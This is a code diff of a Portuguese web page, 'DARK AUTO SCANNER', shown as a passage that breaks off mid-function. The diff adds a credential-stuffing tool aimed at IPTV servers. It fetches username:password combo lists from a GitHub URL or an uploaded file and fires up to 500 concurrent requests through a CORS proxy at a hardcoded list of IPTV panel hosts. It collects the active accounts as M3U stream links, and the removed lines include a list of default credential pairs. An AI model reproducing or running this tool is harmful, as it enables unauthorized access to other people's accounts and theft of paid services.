@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-<title>GERADOR DE M3U DARK</title>
+<title>DARK AUTO SCANNER - GERADOR M3U</title>
 <style>
   /* ==== VARIÁVEIS DE TEMA - TEMA ESCURO + RAIOS ==== */
   :root {
@@ -157,6 +157,53 @@
     margin-bottom: 15px;
   }
   
+  form label {
+    color: var(--accent-color-light);
+    font-weight: 600;
+    user-select: none;
+    margin-bottom: 5px;
+    font-size: 0.9rem;
+  }
+  
+  input[type=text], input[type=number], input[type=file], select {
+    background: var(--input-bg);
+    border: 1px solid var(--input-border);
+    color: var(--text-color);
+    padding: 10px 12px;
+    font-size: 0.95rem;
+    border-radius: 6px;
+    transition: border-color 0.3s ease;
+    width: 100%;
+    height: 44px;
+  }
+  
+  input[type=text]:focus, input[type=number]:focus, input[type=file]:focus, select:focus {
+    border-color: var(--accent-color);
+    outline: none;
+  }
+  
+  input[type=number] {
+    max-width: 100%;
+  }
+  
+  .checkbox-container {
+    display: flex;
+    align-items: flex-start;
+    gap: 10px;
+    margin-top: 8px;
+  }
+  
+  .checkbox-container input[type="checkbox"] {
+    width: auto;
+    margin-top: 3px;
+    flex-shrink: 0;
+  }
+  
+  .checkbox-container label {
+    margin-bottom: 0;
+    line-height: 1.3;
+  }
+  
   /* ==== BOTÕES ==== */
   button {
     background-color: var(--btn-bg);
@@ -187,10 +234,40 @@
     box-shadow: none;
   }
   
+  /* ===== BARRA DE PROGRESSO ===== */
+  .progress-container {
+    background-color: var(--progress-bg);
+    border-radius: 12px;
+    box-shadow: inset 0 0 8px #0009;
+    overflow: hidden;
+    height: 25px;
+    margin: 15px 0;
+    position: relative;
+  }
+  
+  .progress-bar {
+    background: var(--progress-fill);
+    height: 100%;
+    width: 0%;
+    transition: width 0.4s ease;
+  }
+  
+  .progress-text {
+    position: absolute;
+    right: 10px;
+    top: 3px;
+    font-weight: 700;
+    color: var(--text-color);
+    text-shadow: 0 0 4px #000c;
+    user-select: none;
+    font-size: 0.85rem;
+  }
+  
   /* ===== ESTATÍSTICAS ===== */
   .stats {
     display: flex;
-    justify-content: center;
+    flex-wrap: wrap;
+    justify-content: space-around;
     gap: 10px;
     margin-bottom: 20px;
   }
@@ -207,6 +284,8 @@
     user-select: none;
     box-shadow: 0 0 10px transparent;
     transition: box-shadow 0.3s ease;
+    flex: 1;
+    min-width: 0;
   }
   
   .stat-item.hit {
@@ -214,9 +293,9 @@
     box-shadow: 0 0 12px var(--success-color);
   }
   
-  .stat-item.tested {
-    color: var(--accent-color-light);
-    box-shadow: 0 0 12px var(--accent-color);
+  .stat-item.error {
+    color: var(--error-color);
+    box-shadow: 0 0 14px var(--error-color);
   }
   
   /* ===== RESULTADOS ===== */
@@ -244,25 +323,17 @@
     box-shadow: 0 0 10px #00ffff55;
     position: relative;
     transition: background-color 0.3s ease;
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
   }
   
   .hit-item:hover {
     background: #005564cc;
   }
   
-  .hit-content {
-    flex-grow: 1;
-    margin-right: 10px;
-    word-break: break-all;
-  }
-  
   /* Botões do hit */
   .hit-actions {
-    display: flex;
-    gap: 5px;
+    position: absolute;
+    top: 6px;
+    right: 10px;
   }
   
   .hit-actions button {
@@ -271,6 +342,7 @@
     color: var(--accent-color-light);
     font-size: 1rem;
     cursor: pointer;
+    margin-left: 8px;
     transition: color 0.3s ease;
     padding: 2px 6px;
     border-radius: 6px;
@@ -285,7 +357,7 @@
   /* BOTÕES GERAIS DE CONTROLE */
   .controls {
     display: grid;
-    grid-template-columns: repeat(4, 1fr);
+    grid-template-columns: repeat(2, 1fr);
     gap: 10px;
     margin-top: 15px;
   }
@@ -329,30 +401,73 @@
     z-index: 1;
   }
   
-  /* Espaço para anúncios */
-  .ad-container {
+  /* Área de anúncios */
+  .ads-container {
     width: 100%;
-    max-width: 728px;
-    margin: 20px auto;
+    margin: 20px 0;
     text-align: center;
-    background: rgba(0, 0, 0, 0.3);
+    min-height: 90px;
+    background: rgba(18, 19, 31, 0.7);
     border-radius: 8px;
     padding: 10px;
-    min-height: 90px;
     display: flex;
     align-items: center;
     justify-content: center;
   }
   
-  .ad-placeholder {
-    color: #777;
-    font-style: italic;
+  /* Textarea para resultados */
+  .m3u-results {
+    width: 100%;
+    min-height: 200px;
+    background: #121522;
+    color: #a0f0ff;
+    border-radius: 8px;
+    padding: 12px;
+    font-family: monospace;
+    font-size: 0.85rem;
+    margin-top: 15px;
+    resize: vertical;
+    border: 1px solid var(--input-border);
+  }
+  
+  .m3u-item {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    margin-bottom: 10px;
+    padding: 8px;
+    background: #002633;
+    border-radius: 6px;
+  }
+  
+  .m3u-link {
+    flex: 1;
+    word-break: break-all;
+    padding-right: 10px;
+  }
+  
+  .copy-btn {
+    background: var(--btn-bg);
+    color: var(--accent-color);
+    border: none;
+    border-radius: 4px;
+    padding: 6px 10px;
+    cursor: pointer;
+    transition: background 0.3s;
+  }
+  
+  .copy-btn:hover {
+    background: var(--btn-hover-bg);
   }
   
   /* RESPONSIVO */
   @media (min-width: 601px) {
+    form {
+      grid-template-columns: 1fr 1fr;
+    }
+    
     .controls {
-      grid-template-columns: repeat(4, 1fr);
+      grid-template-columns: repeat(5, 1fr);
     }
     
     button {
@@ -364,10 +479,18 @@
       font-size: 0.88rem;
     }
     
+    .stats {
+      gap: 15px;
+    }
+    
     .stat-item {
       min-width: 120px;
       font-size: 1rem;
       padding: 10px 15px;
+    }
+    
+    input[type=number] {
+      max-width: 100px;
     }
     
     main {
@@ -383,6 +506,15 @@
   @media (max-width: 360px) {
     .controls {
       grid-template-columns: 1fr;
+    }
+    
+    .stats {
+      flex-direction: column;
+      gap: 8px;
+    }
+    
+    .stat-item {
+      min-width: 100%;
     }
     
     .results-container {
@@ -403,29 +535,73 @@
   <span></span><span></span><span></span><span></span><span></span>
 </div>
 <header aria-label="Título do scanner">
-  <div class="typing flicker" id="animated-title">GERADOR DE M3U DARK</div>
+  <div class="typing flicker" id="animated-title">DARK AUTO SCANNER - GERADOR M3U</div>
 </header>
-
-<!-- Espaço para anúncios AdSense -->
-<div class="ad-container">
-  <div class="ad-placeholder">Espaço para anúncios AdSense</div>
-</div>
-
 <main>
+  <!-- Área de anúncios AdSense -->
+  <div class="ads-container">
+    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-seu-codigo-aqui"
+     crossorigin="anonymous"></script>
+    <ins class="adsbygoogle"
+         style="display:block"
+         data-ad-client="ca-pub-seu-codigo-aqui"
+         data-ad-slot="seu-slot-aqui"
+         data-ad-format="auto"
+         data-full-width-responsive="true"></ins>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({});
+    </script>
+  </div>
+  
   <form id="configForm" autocomplete="off" aria-label="Configurações do scanner">
-    <button id="generateBtn" type="button">GERAR M3U</button>
+    <label for="threadCount">Bots concorrentes *</label>
+    <input type="number" id="threadCount" min="1" max="500" value="100" required aria-required="true" />
+    
+    <label for="comboFile">Carregar arquivo de combos (txt):</label>
+    <input type="file" id="comboFile" accept=".txt" />
+    
+    <div class="checkbox-container">
+      <input type="checkbox" id="showCategory" checked>
+      <label for="showCategory">Exibir informações completas (categoria)</label>
+    </div>
+    
+    <div class="checkbox-container">
+      <input type="checkbox" id="turboMode" checked>
+      <label for="turboMode">JUNTOS SOMOS MAIS FORTES @HidanImortal @FENIXHTML @davidlima762 @DARKMENSAGEIRO E TODAS AS PARCERIAS, AS DNS NÃO PODE PARAR!</label>
+    </div>
+    
+    <div class="checkbox-container">
+      <input type="checkbox" id="useProxy" checked>
+      <label for="useProxy">Usar Proxy CORS (recomendado)</label>
+    </div>
   </form>
   
+  <div class="progress-container" aria-live="polite" aria-label="Barra de progresso">
+    <div class="progress-bar" id="progressBar"></div>
+    <div class="progress-text" id="progressText">0%</div>
+  </div>
+  
   <div class="stats" aria-live="polite" aria-label="Estatísticas em tempo real">
+    <div class="stat-item" id="totalTested">Testados: 0</div>
     <div class="stat-item hit" id="totalHits">Hits: 0</div>
-    <div class="stat-item tested" id="totalTested">Testados: 0</div>
+    <div class="stat-item error" id="totalErrors">Erros: 0</div>
+    <div class="stat-item" id="reqPerSec">Req/s: 0</div>
+    <div class="stat-item" id="botsActive">Bots Ativos: 0</div>
+    <div class="stat-item" id="botsRemaining">Bots Restantes: 0</div>
   </div>
   
   <div class="controls" role="group" aria-label="Controles do scanner">
+    <button id="generateBtn" type="button" aria-pressed="false">Gerar M3U</button>
     <button id="stopBtn" type="button" disabled aria-pressed="false">Parar</button>
     <button id="clearBtn" type="button">Limpar</button>
     <button id="exportBtn" type="button" disabled>Exportar Hits</button>
     <button id="copyAllBtn" type="button" disabled>Copiar Todos</button>
+  </div>
+  
+  <!-- Textarea para mostrar os 10 primeiros resultados -->
+  <h3 style="margin-top: 20px; color: var(--accent-color);">Top 10 Links M3U Gerados:</h3>
+  <div id="m3uResultsContainer">
+    <!-- Os links M3U serão inseridos aqui -->
   </div>
   
   <section class="results-container" id="results" tabindex="0" aria-label="Resultados dos hits encontrados" aria-live="polite" aria-relevant="additions">
@@ -435,390 +611,796 @@
 <footer>FEITO POR DARK MENSAGEIRO</footer>
 <div id="notification" role="alert" aria-live="assertive"></div>
 <script>
-  // Lista de servidores Xtream Codes confirmados (atualizada)
+  // Lista de servidores fixos
   const servers = [
-    "http://cdn.jccob.click",
+    "http://belize-transport33.sbs:80",
+    "http://bpbe.one:80",
+    "http://brone.fyi",
+    "http://c4n.fun",
+    "http://cinefull.space:80",
     "http://cinepulse.live",
+    "http://dns.carnes.ink:80",
+    "http://dns.cebola.pro:80",
+    "http://dns.falcon90.store:80",
     "http://firetop1.site",
+    "http://fthzx.online:80",
     "http://kstv.us:8080",
     "http://limed.cc",
     "http://minhatv.eu",
+    "http://newbox.space:80",
     "http://nitrohd.xyz",
+    "http://nitrohd.xyz:80",
     "http://pfsv.io:80",
     "http://pgzva.my",
+    "http://prvdbrack.xyz:80",
     "http://relogio10.top",
     "http://vtrev.cc",
     "http://xci.nz:80",
     "http://brothersplay.com:80",
-    "http://dark.topk.live:80",
-    "http://dns.gpsrv.shop:80",
-    "http://hsgbola1.xyz",
-    "http://mamaodoce.online",
-    "http://saltbrth.xyz",
-    "http://touroboxv4.redemais.click:80",
-    "http://vela2b.sbs:80",
-    "http://vip.tvhome.click:80",
-    "http://x.mx51.online:80",
-    "http://pbkblack.site",
-    "http://cdn11.cc:80",
-    "http://fiufiu.live:80",
-    "http://hdtvs.top:80",
-    "http://holtcomfast.icu",
-    "http://oneplay.cc",
-    "http://v4.agenciav4.top",
-    "http://vyvofibra.us",
-    "http://b1.svb32fg.icu",
-    "http://axr7.one:80",
-    "http://bananadoce.online:80",
-    "http://lb01.site",
-    "http://hsgbola1.xyz:80",
-    "http://natkcz.xyz:80",
-    "http://oldmonkey.fun:80",
-    "http://a.mx51.online:80",
-    "http://buzbond.bond:80",
-    "http://familyplayy.top:80",
-    "http://levitashow.click:80",
-    "http://sw2z.in:80",
-    "http://jamboso.com",
-    "http://opaioo.com",
-    "http://gangaplayer.com:80",
-    "http://mixmil.cyou:80",
-    "http://sonicstream.shop:80",
-    "http://1296x.srvsh.xyz",
-    "http://12ww11.top",
-    "http://138.199.41.6:80",
-    "http://14225021914.com:80",
-    "http://149.18.18.90:80",
-    "http://15aera.xyz",
-    "http://15aera.xyz:80",
-    "http://178.162.193.239:2052",
-    "http://178.162.193.239:8080",
-    "http://178.162.197.167:2052",
-    "http://178.162.197.175",
-    "http://178.162.197.175:80",
-    "http://178.162.197.175:8080",
-    "http://178.162.197.184:2052",
-    "http://178.162.212.141:2052",
-    "http://178.162.212.150:2052",
-    "http://179.60.53.20:55577",
-    "http://185.194.204.156:80",
-    "http://1play.cool:8000",
-    "http://2.magmas5.com:8000",
-    "http://2.villevalo.pro",
-    "http://244a.cc:80",
-    "http://4.iptv11.is:80",
-    "http://4f.rs:80",
-    "http://4tv.site",
-    "http://4tv.site:80",
-    "http://5ce.co:80",
-    "http://5ce.me",
-    "http://5ce.me:80",
-    "http://5central.me",
-    "http://5central.me:80",
-    "http://5estrelas.top:80",
-    "http://5network.cyou",
-    "http://5network.cyou:80",
-    "http://5stak.xyz:80",
-    "http://6digital9.chocoplus.xyz:8080",
-    "http://7779rt.top",
-    "http://7779rt.top:80",
-    "http://7cdnmax.xyz:8080",
-    "http://7forever.xyz:80",
-    "http://7forever.xyz:8080",
-    "http://7max.top",
-    "http://7max.top:80",
-    "http://7max.top:8080",
-    "http://7online.xyz",
-    "http://7online.xyz:80",
-    "http://7rota1app.link",
-    "http://Cdnbrux.top",
-    "http://EXM3U.77xxs.xyz",
-    "http://Vis.blue:80",
-    "http://a.srvhib.com.br",
-    "http://ad44.shop:8080",
-    "http://amorvenceu.top:80",
-    "http://analov.lat",
-    "http://app.tecnomolly.com:8080",
-    "http://arrepiado.xyz",
-    "http://atlas06.xyz:80",
-    "http://bevolahouse.uk:8080",
-    "http://bgouv13.com:80",
-    "http://bincp.xyz",
-    "http://binwtorre.online:80",
-    "http://blogtiger.win:8080",
-    "http://bogotaresort.vip:8080",
-    "http://cairogroup.uk:8080",
-    "http://canal.cdntv.com.br:80",
-    "http://canexcorso.net:8080",
-    "http://cdn.xuiinstall.fun:80",
-    "http://cdn4k.info",
-    "http://cdn4k.us",
-    "http://cdn4k.vip:80",
-    "http://cdn7ever.xyz:80",
-    "http://cdn7light.xyz:80",
-    "http://cdn88.xyz",
-    "http://cinepulse.xyz:80",
-    "http://cldnew.com",
-    "http://cm1.portaltv.info:777",
-    "http://costela.top",
-    "http://cuvillier.gentv.to:8080",
-    "http://d.rodeo:80",
-    "http://dns.aipim.info:80",
-    "http://dns.aipim.info:8080",
-    "http://dns.ulttv.xyz",
-    "http://dnsbr.cloud",
-    "http://dnsbr.xyz",
-    "http://dnsrp.abre.xyz:80",
-    "http://dnssp.site:80",
-    "http://dsmar.mov:80",
-    "http://ecliente.xyz",
-    "http://fastream.xyz:8080",
-    "http://fastrunner.live:8080",
-    "http://fhdgdhg25.lat",
-    "http://gameplay.p2sweb.me",
-    "http://geniuscore.uk:8080",
-    "http://globe4.midomed.com:8883",
-    "http://golduhdtv.net",
-    "http://goodcine.my",
-    "http://gopro7.xyz",
-    "http://gopro7.xyz:8080",
-    "http://grtsv1.life",
-    "http://inter.natv.fm",
-    "http://invictosplay.xyz",
-    "http://kaantv.site:8000",
-    "http://kotkoyo.mine.nu:48028",
-    "http://kstv.us:80",
-    "http://ktm42.xyz:2052",
-    "http://letmein.fun:8080",
-    "http://llllllllliosdaiiii1iiiiiiiii.funtogether.xyz:8080",
-    "http://m1-max.dns-speedy.com",
-    "http://m3umais.ovh:8080",
-    "http://miotvtop.hdwcam.com:8080",
-    "http://motoplatxrd.com:80",
-    "http://natsdns.com:8080",
-    "http://newmundo.top:8880",
-    "http://nhflix.xyz",
-    "http://novo1.xyz:80",
-    "http://ottvision.xyz:8080",
-    "http://p1.proiptv.co:88",
-    "http://pegcv.xyz:8880",
-    "http://pfsrv.com:80",
-    "http://picapaunet.top:80",
-    "http://piratuga.xyz",
-    "http://play.biturl.vip",
-    "http://premiumtop.top:8080",
-    "http://proxy.cdn4k.vip",
-    "http://proxy.cdn4k.vip:80",
-    "http://pvsrvs.xyz:80",
-    "http://qacvz.my:80",
-    "http://radionivus.shop:80",
-    "http://ratomickey.eu",
-    "http://ratomickey.eu:8080",
-    "http://russofv.cc",
-    "http://serv1.xyz",
-    "http://server.iptvxxx.net",
-    "http://smdz.site",
-    "http://smt.appxc.top:80",
-    "http://snopy.mochaiptv.xyz:8000",
-    "http://sp.kiwi:80",
-    "http://srv.hostinggon.xyz:2095",
-    "http://srv.hostinggon12.xyz",
-    "http://srv.hostinggon15.xyz",
-    "http://srv.hostinggon39.xyz",
-    "http://srv.polkafood.pl:80",
-    "http://srvdp.me",
-    "http://srvtop.cloud:80",
-    "http://starplaybr.online:80",
-    "http://supersonictv.live:8080",
-    "http://techplay.click",
-    "http://techplay.click:80",
-    "http://telecine.asia",
-    "http://terenet.net:80",
-    "http://topserver.fun:80",
-    "http://tv.com.vc",
-    "http://tv.dimaiptv.com:8080",
-    "http://tv1.my:80",
-    "http://tv5.me:80",
-    "http://tv5.me:80",
-    "http://tvlg.appxc.top",
-    "http://ust.lat",
-    "http://veloz.dnstv.uk:80",
-    "http://vip.dom1tv.com",
-    "http://vivaoavida.xyz",
-    "http://wolftkxz.xyz:80",
-    "http://world-qualite.xyz:8080",
-    "http://xp2.wtf",
-    "http://cdn22.cc:80",
-    "http://rtdkh.xyz:80",
-    "http://cms-central.co",
-    "http://gurutuga.pw:8080",
-    "http://bcltop.online",
-    "http://dns.3558510632.click:80",
-    "http://dns.gerenciadorr8.top",
-    "http://livraria.fun:80",
-    "http://opdestiny.top:80",
-    "http://pfsv.io",
-    "http://sualista.xyz",
-    "http://tucxs.click",
-    "http://v4.agenciav4.top:80",
-    "http://veloz.tvbrlive.com",
-    "http://voxp2p.live",
-    "http://xuione.icu:80",
-    "http://agrtv.click:80",
-    "http://cgpdok.xyz:80",
-    "http://amplay.lat:80",
-    "http://maisonxp.click:8080",
-    "http://mistertech.click:80",
-    "http://tvsbt.top:80",
-    "http://vdeos.pics:80",
-    "http://horizon25.shop",
-    "http://cdn.proxybrasilctvp2.com.br",
-    "http://cdn018.io",
-    "http://cdn11.cc",
-    "http://cdn22.cc",
-    "http://cdn33.cc",
-    "http://cdn45.cc",
-    "http://cdn46.cc",
-    "http://cdn49.cc",
-    "http://cdwmed.xyz",
-    "http://cinefull.space",
-    "http://cliente33.com",
-    "http://cnaxtrax.com",
-    "http://coco-cdn2.cc",
-    "http://dnscine.top:80",
-    "http://jamboso.com:80",
-    "http://sskkdk.srv1ydfg.icu:80",
-    "http://bananadoce.online",
-    "http://felas87dz.icu",
-    "http://steamtv.site",
-    "http://supg.nl",
-    "http://telefone.site:80",
-    "http://turbo.gftv.in:80",
-    "http://viphlvp.xyz:8080",
-    "http://virtusz.zapto.org:80",
-    "http://vmw12.com:80",
-    "http://x2caverinhas.store",
-    "http://xcloudcine.xyz:80",
-    "http://z3.bgts37bc.icu",
-    "http://b1.svb32fg.icu:80",
-    "http://btpx.store:80",
-    "http://bullbr.xyz:80",
-    "http://carabina.pro:80",
-    "http://cdn.jccob.click:80",
-    "http://cdnrptv.com:80",
-    "http://cgpdok.xyz",
-    "http://cinepulse.live:80",
-    "http://ctbnotas.xyz",
-    "http://dns.masteron.fun:80",
-    "http://dns.play-tv.live:80",
-    "http://eckgo.xyz",
-    "http://firetop1.site:80",
-    "http://globalsuper.site:80",
-    "http://gw38.site",
-    "http://hmiguel5.org:80",
-    "http://huloftibu.lol",
-    "http://jctv.drivecar.click:80",
-    "http://jrplay.online:80",
-    "http://lb01.site:80",
-    "http://mw3.tvzinha.org:8080",
-    "http://nandovip.xyz",
-    "http://newoneblack.site",
-    "http://newoneblack.site:80",
-    "http://norrfqf.top:8080",
-    "http://oax.life",
-    "http://rgdtuner.xyz",
-    "http://s.abapx.in:80",
-    "http://sandertvcl.com:8080",
-    "http://semprea100.org:8080",
-    "http://sep22x.in:80",
-    "http://smartvtcl.site:8080",
-    "http://smt.appxc.top",
-    "http://srvplay.live:80",
-    "http://ad3xiy.xyz:80",
-    "http://cbvc.xyz:80",
-    "http://dns.acaidopara.net:80",
-    "http://horizon25.shop:80",
-    "http://alpacinoo.com",
-    "http://carabina.pro",
-    "http://halamix.in:80",
-    "http://omelhor.sucodefruta.xyz",
-    "http://rnplay07.vip",
-    "http://v220xpco.com:80",
-    "http://c.maintech.top",
-    "http://cdn.ax66.shop",
-    "http://gestor.mom"
+    "http://cdn.apkwuv.xyz:80"
   ];
   
-  // Lista de combos comuns (baseado em pesquisas na web)
-  const commonCombos = [
-    "test:test",
-    "demo:demo",
-    "admin:admin",
-    "user:pass",
-    "1234:1234",
-    "1111:1111",
-    "0000:0000",
-    "guest:guest",
-    "free:free",
-    "trial:trial",
-    "teste:teste",
-    "usuario:senha",
-    "root:root",
-    "client:client",
-    "m3u:m3u",
-    "iptv:iptv",
-    "stream:stream",
-    "tv:tv",
-    "123:123",
-    "1:1",
-    "a:a",
-    "b:b",
-    "c:c",
-    "d:d",
-    "e:e",
-    "f:f",
-    "g:g",
-    "h:h",
-    "i:i",
-    "j:j",
-    "k:k",
-    "l:l",
-    "m:m",
-    "n:n",
-    "o:o",
-    "p:p",
-    "q:q",
-    "r:r",
-    "s:s",
-    "t:t",
-    "u:u",
-    "v:v",
-    "w:w",
-    "x:x",
-    "y:y",
-    "z:z",
-    "abc:abc",
-    "qwe:qwe",
-    "asd:asd",
-    "zxc:zxc",
-    "12345:12345",
-    "54321:54321",
-    "qwerty:qwerty",
-    "password:password",
-    "123456:123456",
-    "12345678:12345678",
-    "123456789:123456789",
-    "1234567890:1234567890",
-    "admin123:admin123",
-    "root123:root123",
-    "user123:user123",
-    "pass123:pass123",
-    "test123:test123",
-    "demo123:demo123",
-    "guest123:guest123",
-    "free123:free123",
-    "trial123:trial123",
-    "temp:temp",
-    "temp123:temp123",
-    "temporary:temporary",
-    "
+  // ===== CONSTANTES & ESTADOS =====
+  const generateBtn = document.getElementById('generateBtn');
+  const stopBtn = document.getElementById('stopBtn');
+  const clearBtn = document.getElementById('clearBtn');
+  const exportBtn = document.getElementById('exportBtn');
+  const copyAllBtn = document.getElementById('copyAllBtn');
+  const progressBar = document.getElementById('progressBar');
+  const progressText = document.getElementById('progressText');
+  const resultsContainer = document.getElementById('results');
+  const m3uResultsContainer = document.getElementById('m3uResultsContainer');
+  const notification = document.getElementById('notification');
+  const showCategoryCheckbox = document.getElementById('showCategory');
+  const turboModeCheckbox = document.getElementById('turboMode');
+  const useProxyCheckbox = document.getElementById('useProxy');
+  const comboFileInput = document.getElementById('comboFile');
+  const stats = {
+    totalTested: document.getElementById('totalTested'),
+    totalHits: document.getElementById('totalHits'),
+    totalErrors: document.getElementById('totalErrors'),
+    reqPerSec: document.getElementById('reqPerSec'),
+    botsActive: document.getElementById('botsActive'),
+    botsRemaining: document.getElementById('botsRemaining'),
+  };
+  
+  let workerPool = 0;
+  let maxWorkers = 0;
+  let combos = [];
+  let resultsHits = [];
+  let resultsSet = new Set();
+  let stopRequested = false;
+  let totalProcessed = 0;
+  let totalErrors = 0;
+  let totalHits = 0;
+  let startTime = 0;
+  let lastUpdateTime = 0;
+  
+  // Retry max attempts
+  const MAX_RETRIES = 2;
+  
+  // Função para mostrar notificação visual e sonora
+  function showNotification(msg, duration = 5000) {
+    notification.textContent = msg;
+    notification.classList.add('show');
+    try {
+      const audioCtx = new AudioContext();
+      const oscillator = audioCtx.createOscillator();
+      oscillator.type = 'triangle';
+      oscillator.frequency.setValueAtTime(440, audioCtx.currentTime);
+      oscillator.connect(audioCtx.destination);
+      oscillator.start();
+      oscillator.stop(audioCtx.currentTime + 0.15);
+    } catch {}
+    setTimeout(() => {
+      notification.classList.remove('show');
+    }, duration);
+  }
+  
+  // Função delay util
+  function delay(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
+  }
+  
+  // ===== UTILIDADES DE FORMATAÇÃO =====
+  function formatDate(dateStr) {
+    if(!dateStr) return 'Desconhecida';
+    // Se é timestamp (segundos)
+    if(/^\d+$/.test(dateStr)) {
+      return new Date(parseInt(dateStr) * 1000).toLocaleDateString('pt-BR');
+    }
+    // Tenta Date normal
+    const d = new Date(dateStr);
+    if(isNaN(d)) return 'Desconhecida';
+    return d.toLocaleDateString('pt-BR');
+  }
+  
+  // Escapa HTML para prevenção simples de injection
+  function escapeHtml(text) {
+    return text.replace(/[&<>"']/g, function(m) {
+      return {'&':'&amp;', '<':'&lt;', '>':'&gt;', '"':'&quot;', "'":'&#39;'}[m];
+    });
+  }
+  
+  // ===== FUNÇÃO PARA CARREGAR COMBOS ONLINE =====
+  async function loadCombosOnline() {
+    try {
+      // URL corrigida para acessar o arquivo raw do GitHub
+      const response = await fetch('https://raw.githubusercontent.com/guedescomvc2025-bot/COMBO-DARK-ONLINE/main/todos_combos.txt');
+      if (!response.ok) {
+        throw new Error(`Erro ao carregar combos: ${response.status}`);
+      }
+      const text = await response.text();
+      let lines = text.split(/\r?\n/).map(l => l.trim()).filter(l => l && !l.startsWith('#'));
+      combos = lines.filter(l => l.includes(':')); // mínimo username:password
+      showNotification(`${combos.length} combos carregados online.`);
+      return true;
+    } catch (error) {
+      showNotification(`Erro ao carregar combos: ${error.message}`);
+      console.error('Erro ao carregar combos:', error);
+      return false;
+    }
+  }
+  
+  // ===== FUNÇÃO PARA CARREGAR COMBOS DE ARQUIVO =====
+  async function loadCombosFromFile(file) {
+    return new Promise((resolve, reject) => {
+      const reader = new FileReader();
+      reader.onload = function(e) {
+        try {
+          const text = e.target.result;
+          let lines = text.split(/\r?\n/).map(l => l.trim()).filter(l => l && !l.startsWith('#'));
+          const fileCombos = lines.filter(l => l.includes(':')); // mínimo username:password
+          combos = fileCombos;
+          showNotification(`${combos.length} combos carregados do arquivo.`);
+          resolve(true);
+        } catch (error) {
+          showNotification(`Erro ao processar arquivo: ${error.message}`);
+          reject(error);
+        }
+      };
+      reader.onerror = function() {
+        showNotification('Erro ao ler o arquivo.');
+        reject(new Error('Erro ao ler o arquivo.'));
+      };
+      reader.readAsText(file);
+    });
+  }
+  
+  // ===== FUNÇÃO PRINCIPAL DE TESTE DE COMBO =====
+  async function testCombo(host, username, password, attempt = 0) {
+    const controller = new AbortController();
+    const timeoutId = setTimeout(() => controller.abort(), 20000); // Timeout aumentado para 20s
+    
+    // Garantir que o host tenha o prefixo http://
+    let formattedHost = host;
+    if (!host.startsWith('http://') && !host.startsWith('https://')) {
+      formattedHost = 'http://' + host;
+    }
+    
+    // URL base da API
+    const baseUrl = `${formattedHost}/player_api.php?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`;
+    const userInfoUrl = `${baseUrl}&action=get_user_info`;
+    
+    try {
+      // Verificar se deve usar proxy
+      const useProxy = useProxyCheckbox.checked;
+      const proxyUrl = useProxy ? 'https://corsproxy.io/?' : '';
+      
+      // Fazer requisição para obter informações do usuário
+      const userInfoResponse = await fetch(proxyUrl + userInfoUrl, {
+        signal: controller.signal,
+        headers: { 'Accept': 'application/json' },
+        cache: 'no-store'
+      });
+      
+      clearTimeout(timeoutId);
+      
+      // Verificar se a resposta foi bem-sucedida
+      if (!userInfoResponse.ok) {
+        throw new Error(`HTTP error! status: ${userInfoResponse.status}`);
+      }
+      
+      // Parsear os dados
+      const userInfo = await userInfoResponse.json();
+      
+      // Verificar se o usuário está ativo
+      if (userInfo && userInfo.user_info && userInfo.user_info.status === 'Active') {
+        // Contar canais e categorias
+        let liveCount = 0;
+        let movieCount = 0;
+        let seriesCount = 0;
+        
+        // Tentar obter mais informações se disponíveis
+        try {
+          const liveStreamsUrl = `${baseUrl}&action=get_live_streams`;
+          const liveCategoriesUrl = `${baseUrl}&action=get_live_categories`;
+          const vodCategoriesUrl = `${baseUrl}&action=get_vod_categories`;
+          const seriesCategoriesUrl = `${baseUrl}&action=get_series_categories`;
+          
+          const [liveStreamsResponse, liveCategoriesResponse, vodCategoriesResponse, seriesCategoriesResponse] = await Promise.all([
+            fetch(proxyUrl + liveStreamsUrl, {
+              signal: controller.signal,
+              headers: { 'Accept': 'application/json' },
+              cache: 'no-store'
+            }),
+            fetch(proxyUrl + liveCategoriesUrl, {
+              signal: controller.signal,
+              headers: { 'Accept': 'application/json' },
+              cache: 'no-store'
+            }),
+            fetch(proxyUrl + vodCategoriesUrl, {
+              signal: controller.signal,
+              headers: { 'Accept': 'application/json' },
+              cache: 'no-store'
+            }),
+            fetch(proxyUrl + seriesCategoriesUrl, {
+              signal: controller.signal,
+              headers: { 'Accept': 'application/json' },
+              cache: 'no-store'
+            })
+          ]);
+          
+          if (liveStreamsResponse.ok) {
+            const liveStreams = await liveStreamsResponse.json();
+            liveCount = Array.isArray(liveStreams) ? liveStreams.length : 0;
+          }
+          
+          if (vodCategoriesResponse.ok) {
+            const vodCategories = await vodCategoriesResponse.json();
+            movieCount = Array.isArray(vodCategories) ? vodCategories.length : 0;
+          }
+          
+          if (seriesCategoriesResponse.ok) {
+            const seriesCategories = await seriesCategoriesResponse.json();
+            seriesCount = Array.isArray(seriesCategories) ? seriesCategories.length : 0;
+          }
+        } catch (e) {
+          // Ignorar erros ao obter categorias e streams
+          console.log("Erro ao obter informações adicionais:", e);
+        }
+        
+        const expirationDate = userInfo.user_info.exp_date ?
+          new Date(parseInt(userInfo.user_info.exp_date) * 1000).toLocaleDateString('pt-BR') :
+          'Desconhecida';
+          
+        return {
+          valid: true,
+          username,
+          password,
+          host: formattedHost,
+          status: userInfo.user_info.status,
+          expiration: expirationDate,
+          created_at: userInfo.user_info.created_at || '',
+          maxConnections: userInfo.user_info.max_connections || 'Desconhecido',
+          m3uLink: `${formattedHost}/get.php?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&type=m3u_plus`,
+          m3uPlusLink: `${formattedHost}/get.php?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&type=m3u_plus`,
+          enigmaLink: `${formattedHost}/get.php?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&type=enigma`,
+          epgUrl: `${formattedHost}/epg.xml`, // supondo padrão
+          counts: {
+            live: liveCount,
+            movies: movieCount,
+            series: seriesCount,
+            total: liveCount + movieCount + seriesCount
+          },
+          data: userInfo
+        };
+      } else {
+        return { valid: false };
+      }
+    } catch (error) {
+      clearTimeout(timeoutId);
+      // Retry inteligente para erros transitórios
